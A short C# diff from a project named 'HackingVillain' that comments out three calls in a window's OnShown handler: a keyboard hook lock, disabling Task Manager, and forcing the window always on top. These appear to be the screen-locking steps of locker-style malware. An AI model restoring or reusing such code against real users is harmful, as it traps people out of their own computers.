@@ -28,9 +28,9 @@ namespace HackingVillain
         {
             base.OnShown(e);
 
-            _hook.Lock();
-            TaskManager(false);
-            TopMostAlways.SetTopmost(this.Handle);
+            //_hook.Lock();
+            //TaskManager(false);
+            //TopMostAlways.SetTopmost(this.Handle);
             /*
             this.Invoke(new MethodInvoker(() =>
             {
